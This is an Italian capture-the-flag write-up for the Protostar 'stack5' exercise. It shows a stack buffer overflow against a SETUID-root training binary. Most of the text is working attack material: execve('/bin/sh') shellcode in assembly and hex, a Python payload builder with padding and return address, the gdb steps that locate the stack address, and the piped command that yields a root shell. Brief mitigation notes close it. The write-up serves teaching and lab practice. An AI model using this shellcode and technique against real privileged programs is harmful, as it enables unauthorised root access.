# Protostar_stack 5 - Stack-based buffer overflow per iniettare codice arbitrario

## Obiettivo della sfida
Esecuzione di codice arbitrario a tempo di esecuzione

## Raccolta informazioni
Il programma **stack5** accetta input locali o da un altro processo ed è **SETUID** e root è il proprietario.  
Nelle sfide precedenti sapevamo cosa iniettare(la funzione _win()_) in questa invece dobbiamo iniettare del codice arbitrario esso verrà scritto in esadecimale e iniettato tramite input.
Potremo utilizzare il codice iniettato per far eseguire una shell.

## Strategia di attacco
Produrre un input contenente lo **shellcode** in codifica esadecimale, i caratteri di **padding** fino all'indirizzo di ritorno e l'**indirizzo iniziale dello shell code** da scrivere nella cella dell'indirizzo di ritorno.  
Dando quest input a **stack5** otteniamo una shell di root poichè stack5 è SETUID root.

### Preparazione dello shellcode
Sappiamo che la dimensione dello shellcode deve essere grande al più 76 byte(distanza fra _buffer_ e indirizzo di ritorno) e non deve contenere byte nulli.  
Preparare uno shellcode è semplice basta utilizzare la funzione C _execve()_, il **problema** è iniettarlo nell'input di stack5
```c
execve("/bin/bash");
exit(0);
```
Leggiamo il manuale della funzione _execve()_  e scopriamo che prende in input tre parametri
1. percorso che punta al processo da eseguire
2. puntatore ad _argv[]_
3. puntatore all'array dell'ambiente _envp[]_

### Analisi dei registri
La Application Binary Interface(ABI) specifica la convenzione per le chiamate di sistema nelle architetture a 32 bit.  
I registri usati per le chiamate di sistema sono:
- **EAX**: identificatore della chiamata di sistema
- **EBX**: primo argomento
- **ECX**: secondo argomento
- **EDX**: terzo argomento

Per convenzione il registro usato per il valore di ritorno è **EAX**

### I nostri parametri
- **EBX**: filename = /bin/sh
- **ECX**: {NULL}
- **EDX**: {NULL}

Il valore di ritorno di _execve_ non viene utilizzato quindi non generiamo codice per gestirlo.

### Scriviamo l'assembly 
Nota: L.E. sta per Little Endian
```assembly
xor  %eax, %eax # poniamo a 0 il registro %eax
push %eax #mettiamo nello stack %eax
push $0x68732f2f # mettiamo nello stack la rappresentazione L.E. di //sh
push $0x6e69622f # mettiamo nello stack la rappresentazione L.E. di /bin
mov  %esp, %ebx # il primo argomento punta alla stringa /bin//sh\0
mov  %eax, %ecx # il secondo argomento punta a null
mov  %eax, %edx # il terzo argomento punto a null
mov  $0xb, %eax # spostiamo il bit meno significativo di %eax
int  $0x80 # tramite l'interrupt 128 il controllo passa al kernel che esegue
          # la chiamata di sistema relativa al contenuto di %eax che è la chiamata a execve()
xor  %eax, %eax # settiamo di nuovo a 0 il contenuto di %eax
inc  %eax # incrementiamo di 1 il contenuto di %eax
int  $0x80 # tramite l'interrupt 128 il controllo passa al kernel che esegue
          # la chiamata di sistema relativa al contenuto di %eax che è la chiamata a exit()
```
### Cosa fare
Bisogna tradurre lo shellcode scritto in una stringa esadecimale, per farlo dobbiamo svolgere i seguenti passi:
#### 1. Creare il file schellcode.s
Basta aprire _nano_ e inserire l'assemby scritto e commentato prima, ricorda che come prima cosa nel file va scritta la riga _shellcode:_ e poi a capo puoi scrivere l'assembly.
#### 2. Compilare il sorgente, 
con -m32 compiliamo a 32bit e con -c non generiamo l'eseguibile
```bash
> gcc -m32 -c shellcode.s -o shellcode.o
```
#### 3. Disassemblare shellcode.o
Utiliziamo _objdump_ per disassemblare _shellcode.o_
```bash
> objdump --disassemble shellcode.o
# l'output è composto dalle istruzioni assembly in esadecimale
```
#### 4. Codifica delle istruzioni 
Codifichiamo le istruzioni esadecimali sotto forma di stringa e otteniamo:
```java
//la stringa è stata spezzata per questioni di formattazione
"\x31\xc0\x50\x68\x2f\x2f\x73"
"\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x89\xc1\x89\xc2\xb0\x0b"
"\xcd\x80\x31\xc0\x40\xcd\x80"
//La sua lunghezza è di 28 byte
```
#### 5. Preparazione dell'input
Creiamo uno script python chiamato _stack5\_payload.py_ che stampa in output l'input da passare a _stack5_
```python
#!/usr/bin/python
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
            "\x68\x68\x2f\x62\x69\x6e\x89" + \
            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
            "\xcd\x80\x31\xc0\x40\xcd\x80";
print shellcode
```
Salviamo l'output in un file
```bash
> python stack5_payload.py > /tmp/payload
```
#### 6. Debug di stack5
Per iniettare il payload nella cella dell'indirizzo di ritorno bisogna ricostruire il layout dello stack per farlo eseguiamo **stack5** con _gdb_
```bash
> gdb -q /opt/protostar/bin/stack5
(gdb) > disas main # disassembliamo il main
# stampa il dump
(gdb) > b*0x080483d9 #inseriamo un breakpoint prima della leave
(gdb) > r < /tmp/payload #passiamo il payload
```
L'ampiezza dell'area di memoria è di 76 byte:
- 28 per lo shellcode
- 36 per il buffer
- 8 per il padding
- 4 cella prima dell'indirizzo di ritorno

Stampiamo l'indirizzo iniziale dello shellcode, esso è contenuto in $esp
```bash
(gdb) > p $esp 
$7= (void *) 0xbffffc90
(gdb) > x/a $esp
0xbffffc90: 0xbffffca0
#0xbffffca0 indirizzo iniziale di shellcode
```
0xbffffca0 va inserito nello script python nella variabile _ret_(indirizzo di ritorno)
#### 7. Modifichiamo lo script python
```python
#!/usr/bin/python

# Parametri da impostare
length = 76
ret = '\xa0\xfc\xff\xbf'
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73" + \
              "\x68\x68\x2f\x62\x69\x6e\x89" + \
            "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
            "\xcd\x80\x31\xc0\x40\xcd\x80";
padding = 'a' * (length - len(shellcode))
payload = shellcode + padding + ret
print payload
```
Salviamo l'output in un file
```bash
> python stack5_payload.py > /tmp/payload
```
## Primo attacco
Eseguiamo **stack5** con _gdb_
```bash
> gdb -q /opt/protostart/bin/stack5
(gdb) > r < /tmp/payload
#la shell viene eseguita ma termina immediatamente
```
L'attacco fallisce anche se **stack5** viene eseguito senza gdb
## Ipotesi
Il debugger ha aggiunto delle variabili d'ambiente, questa cosa non ha dato problemi nelle sfide precedenti perchè facevamo riferimento e un indirizzo specifico del programma e non ad un indirizzo assoluto dello stack.  
Per verificare l'ipotesi lanciamo `env` da terminale e ne analizziamo l'output se è uguale a `gdb show env` possiamo rigettare l'ipotesi. Notiamo che il debugger aggiunge due variabili esse sono _LINES_ e _COLUMNS_, cancelliamo queste due variabili in maniera tale che i due ambienti tornino di nuovo ugali, per farlo eseguiamo:
```bash
(gdb) > unset env LINES
(gdb) > unset env COLUMNS
#disassembliamo il main
(gdb) > disas main
#inseriamo il breakpoint prima della leave
(gdb) > b * 0x080483d9
#eseguiamo il programma con l'input malizioso
(gdb) > r < /tmp/payload
#facciamoci stampare il contenuto di $esp
(gdb) > p $esp
$7= (void *) 0xbffffcb0
(gdb) > x/a $esp
0xbffffcb0: 0xbffffcc0
#0xbffffcc0 da impostare come nuovo valore di ret
#nello script python
```
## Esecuzione
Una volta aggiornato _ret_ con 0xbffffcc0 generiamo il nuovo payload ed eseguiamo **stack5**
```bash
> /opt/protostar/bin/stack5 < /tmp/payload
```
Notiamo che non si ha un crash ma la shell termina immediatamente perchè lo STDIN è vuoto

### Soluzione allo STDIN vuoto
Bisogna dare alla shell iniettata uno STDIN aperto, per farlo modifichiamo il comando che usiamo per lanciare l'attacco
```bash
> (cat /tmp/payload; cat) | /opt/protostar/bin/stack5
```
La prima _cat_ inietta l'input malevolo e attiva la shell, la seconda accetta input da STDIN e lo inoltra alla shell lasciano lo STDIN aperto, così facendo **l'attacco riesce!**

## Debolezze
1. privilegi troppo elevati per stack5
2. la grandezza da assegnare ad una variabile di lunghezza fissa non viene controllata, così facendo un input troppo grande corrompe lo stack
## Mitigazione
1. assegnare a stack5 i giusti privilegi
2. limitare la lunghezza massima dell'input, oppure, usare _fgets()_
